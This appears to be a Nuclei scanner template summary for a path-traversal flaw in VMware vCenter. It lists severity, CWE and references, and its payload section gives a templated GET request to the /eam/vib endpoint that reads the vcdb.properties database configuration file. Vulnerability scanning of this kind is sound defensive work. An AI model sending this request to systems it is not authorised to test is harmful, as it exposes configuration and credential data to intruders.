# Nuclei Template: VMware vCenter - Local File Inclusion
**Template ID:** vmware-vcenter-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`vmware-vcenter-lfi.yaml`)

## Vulnerability Information & PoC

## Description
VMware vCenter is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1
Host: {{Hostname}}
```

## References
- https://kb.vmware.com/s/article/7960893
- https://twitter.com/ptswarm/status/1316016337550938122
